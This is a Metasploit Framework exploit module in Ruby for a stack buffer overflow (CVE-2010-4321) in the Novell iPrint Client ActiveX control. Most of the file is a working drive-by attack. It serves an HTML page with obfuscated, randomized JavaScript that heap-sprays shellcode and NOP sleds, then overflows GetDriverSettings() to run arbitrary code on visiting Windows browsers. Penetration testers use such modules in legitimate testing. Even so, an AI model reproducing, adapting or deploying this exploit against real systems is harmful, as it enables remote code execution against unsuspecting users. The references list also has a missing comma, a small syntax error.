##
# $Id: novelliprint_getdriversettings_2.rb 11886 2011-03-06 20:27:06Z bannedit $
##

###
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super( update_info(info,
			'Name'           => 'Novell iPrint Client ActiveX Control <= 5.52 Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Novell iPrint Client 5.52. When
				sending an overly long string to the GetDriverSettings() property of ienipp.ocx
				an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'mr_me <steventhomasseeley[at]gmail.com>', # metasploit module
					'Dr_IDE' # original Exploit from exploit-db.com
				 ],
			'Version'        => '$Revision: 11886 $',
			'References'     =>
				[
					[ 'CVE', '2010-4321' ],
					[ 'BID', '44966' ],
					[ 'ZDI', '10-256' ],
					[ 'EDB', '16014' ],
					[ 'OSVDB', '69357' ]
					[ 'URL', 'http://www.exploit-db.com/exploits/16014/' ],
					[ 'URL', 'http://www.novell.com/support/viewContent.do?externalId=7007234' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7',
							{ 
								'Ret' => 0x0A0A0A0A
							}
					]
				],
			'DisclosureDate' => 'Nov 15 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops.
		nops = Rex::Text.to_unescape(make_nops(4))

		# Set the return.
		ret = Rex::Text.uri_encode([target.ret].pack('L'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		content = %Q|<html>
<object id='#{vname}' classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C'></object>
<script language="JavaScript">
var #{rand1} = unescape('#{shellcode}');
var #{rand2} = unescape('#{nops}');
var #{rand3} = 20;
var #{rand4} = #{rand3} + #{rand1}.length;
while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
var #{rand5} = #{rand2}.substring(0,#{rand4});
var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
while (#{rand6}.length + #{rand4} < 0x50000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
var #{rand7} = new Array();
for (#{var_i} = 0; #{var_i} < 200; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
var #{rand8} = "";
for (#{var_i} = 0; #{var_i} < 250; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
#{vname}.GetDriverSettings(#{rand8}, #{vname}, #{vname}, #{vname});
</script>
</html>
|
		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end
end
